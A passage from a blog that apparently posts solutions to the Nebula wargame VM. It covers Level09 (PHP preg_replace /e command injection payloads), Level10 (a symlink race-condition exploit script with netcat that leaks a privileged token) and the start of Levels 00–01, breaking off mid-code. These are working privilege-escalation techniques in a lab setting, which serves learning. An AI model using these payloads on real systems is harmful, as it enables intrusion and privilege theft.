<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 -h
</span><span class='line'>Usage: php [options] [-f] &lt;file> [--] [args...]
</span><span class='line'>       php [options] -r &lt;code> [--] [args...]
</span><span class='line'>       php [options] [-B &lt;begin_code>] -R &lt;code> [-E &lt;end_code>] [--] [args...]
</span><span class='line'>       php [options] [-B &lt;begin_code>] -F &lt;file> [-E &lt;end_code>] [--] [args...]
</span><span class='line'>       php [options] -- [args...]
</span><span class='line'>       php [options] -a
</span><span class='line'>
</span><span class='line'>  -a               Run as interactive shell
</span><span class='line'>  -c &lt;path>|&lt;file> Look for php.ini file in this directory
</span><span class='line'>  -n               No php.ini file will be used
</span><span class='line'>  -d foo[=bar]     Define INI entry foo with value 'bar'
</span><span class='line'>  -e               Generate extended information for debugger/profiler
</span><span class='line'>  -f &lt;file>        Parse and execute &lt;file>.
</span><span class='line'>  -h               This help
</span><span class='line'>  -i               PHP information
</span><span class='line'>  -l               Syntax check only (lint)
</span><span class='line'>  -m               Show compiled in modules
</span><span class='line'>  -r &lt;code>        Run PHP &lt;code> without using script tags &lt;?..?>
</span><span class='line'>  -B &lt;begin_code>  Run PHP &lt;begin_code> before processing input lines
</span><span class='line'>  -R &lt;code>        Run PHP &lt;code> for every input line
</span><span class='line'>  -F &lt;file>        Parse and execute &lt;file> for every input line
</span><span class='line'>  -E &lt;end_code>    Run PHP &lt;end_code> after processing all input lines
</span><span class='line'>  -H               Hide any passed arguments from external tools.
</span><span class='line'>  -s               Output HTML syntax highlighted source.
</span><span class='line'>  -v               Version number
</span><span class='line'>  -w               Output source with stripped comments and whitespace.
</span><span class='line'>  -z &lt;file>        Load Zend extension &lt;file>.
</span><span class='line'>
</span><span class='line'>  args...          Arguments passed to script. Use -- args when first argument
</span><span class='line'>                   starts with - or script is read from stdin
</span><span class='line'>
</span><span class='line'>  --ini            Show configuration file names
</span><span class='line'>
</span><span class='line'>  --rf &lt;name>      Show information about function &lt;name>.
</span><span class='line'>  --rc &lt;name>      Show information about class &lt;name>.
</span><span class='line'>  --re &lt;name>      Show information about extension &lt;name>.
</span><span class='line'>  --ri &lt;name>      Show configuration for extension &lt;name>.
</span><span class='line'>
</span><span class='line'>level09@nebula:/home/flag09$ ./flag09 -a
</span><span class='line'>Interactive shell
</span><span class='line'>
</span><span class='line'>php > system('id');
</span><span class='line'>uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
</span><span class='line'>php > system('getflag');
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<p>Second way how to solve this challenge is to use PCRE pattern modifiers vulnerability in <a href="https://php.net/manual/en/reference.pcre.pattern.modifiers.php">PREG_REPLACE_EVAL</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email bla@blabla.com]</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> ./flag09 /tmp/09 testing
</span><span class='line'><span class="go">bla AT blabla dot com</span>
</span></code></pre></td></tr></table></div></figure>


<p>Because we cannot use quotes, we can inject something with <a href="https://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">complex (curly) syntax</a>, that could be used
for strings representation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cat /tmp/09 
</span><span class='line'>[email {${phpinfo()}}]
</span><span class='line'>
</span><span class='line'>sh-4.2$ ./flag09 /tmp/09 | head
</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
</span><span class='line'>phpinfo()
</span><span class='line'>PHP Version => 5.3.6-13ubuntu3.2
</span><span class='line'>
</span><span class='line'>System => Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686
</span><span class='line'>Build Date => Oct 13 2011 23:17:32
</span><span class='line'>Server API => Command Line Interface
</span><span class='line'>Virtual Directory Support => disabled
</span><span class='line'>Configuration File (php.ini) Path => /etc/php5/cli
</span><span class='line'>Loaded Configuration File => /etc/php5/cli/php.ini
</span><span class='line'>Scan this dir for additional .ini files => /etc/php5/cli/conf.d</span></code></pre></td></tr></table></div></figure>


<p>Here the second argument $use_me is invoked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email {${system($use_me)}}]</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> ./flag09 /tmp/09 getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span><span class='line'><span class="go">PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>Actually, I have found the third solution without using $use_me parameter, but recycling $filename:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> cat /tmp/09
</span><span class='line'><span class="go">[email {${system($filename)}}]</span>
</span><span class='line'><span class="go">/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> chmod +x /tmp/09
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) groups=1010(level09)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> /home/flag09/flag09 /tmp/09
</span><span class='line'><span class="go">PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22</span>
</span><span class='line'><span class="go">/tmp/09: line 1: {${system($filename)}}]: bad substitution</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level10</h2>

<figure class='code'><figcaption><span>basic.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>      <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'><span class="cp">#undef HITHERE</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>What to do is immediately clear, there is a race condition in the code, after
we call access() to some file, it could be different file with the same name,
which we are trying to open.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 access
</span><span class='line'>
</span><span class='line'>  Warning:  Using access() to check if a user is authorized to, for example, open
</span><span class='line'>  a file before actually doing so using open(2) creates a security hole, because
</span><span class='line'>  the user might exploit the short time interval between checking and opening the
</span><span class='line'>  file to manipulate it.  For this reason, the use of this system call should be
</span><span class='line'>  avoided.</span></code></pre></td></tr></table></div></figure>


<p>So /home/flag10/flag10 binary sends arbitrary file with access() permission to
some host, port 18211.</p>

<p>We can test it in two screens using:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ nc -l 18211
</span><span class='line'>
</span><span class='line'>sh-4.2$ /home/flag10/flag10 /etc/passwd 0</span></code></pre></td></tr></table></div></figure>


<p>Our exploit:</p>

<figure class='code'><figcaption><span>mklink.sh </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/usr/bin/env bash</span>
</span><span class='line'>
</span><span class='line'>run_netcat<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> nc -l 18211<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>make_symlinks<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> ln -sf /dev/null /tmp/token <span class="p">;</span> ln -sf /home/flag10/token /tmp/token<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>run_flag<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> /home/flag10/flag10 /tmp/token <span class="m">0</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>run_netcat <span class="p">&amp;</span>
</span><span class='line'>make_symlinks <span class="p">&amp;</span>
</span><span class='line'>run_flag <span class="p">&amp;</span>
</span><span class='line'>
</span><span class='line'>sleep 0.05
</span><span class='line'>pkill -P <span class="nv">$$</span> <span class="c"># Kill all children</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> ./mklink.sh
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31349 Terminated              run_netcat</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31350 Terminated              make_symlinks</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31351 Terminated              run_flag</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> su flag10
</span><span class='line'><span class="go">Password: </span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=989(flag10) gid=989(flag10) groups=989(flag10)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/16/exploit-exercises-nebula-00-05/">Exploit-Exercises: Nebula (00-05)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-16T19:04:18+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:04 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<p>Because it was not possible to log in via ssh, we generated the host key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span></code></pre></td></tr></table></div></figure>


<h2>Level00</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> find / <span class="se">\(</span> -perm -4000 <span class="se">\)</span> 2&gt;/dev/null
</span><span class='line'><span class="go">/bin/.../flag00</span>
</span><span class='line'><span class="go">/bin/fusermount</span>
</span><span class='line'><span class="go">/bin/mount</span>
</span><span class='line'><span class="go">/bin/ping</span>
</span><span class='line'><span class="go">/bin/ping6</span>
</span><span class='line'><span class="go">/bin/su</span>
</span><span class='line'><span class="go">[ .. SNIP .. ]</span>
</span></code></pre></td></tr></table></div></figure>


<p>We found a suspicious file on the first line, after executing, we obtained flag.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> id
</span><span class='line'><span class="go">uid=1001(level00) gid=1001(level00) groups=1001(level00)</span>
</span><span class='line'><span class="gp">level00@nebula:~$</span> /bin/.../flag00
</span><span class='line'><span class="go">Congrats, now run getflag to get your flag!</span>
</span><span class='line'><span class="gp">flag00@nebula:~$</span> id
</span><span class='line'><span class="go">uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)</span>
</span><span class='line'><span class="gp">flag00@nebula:~$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level01</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
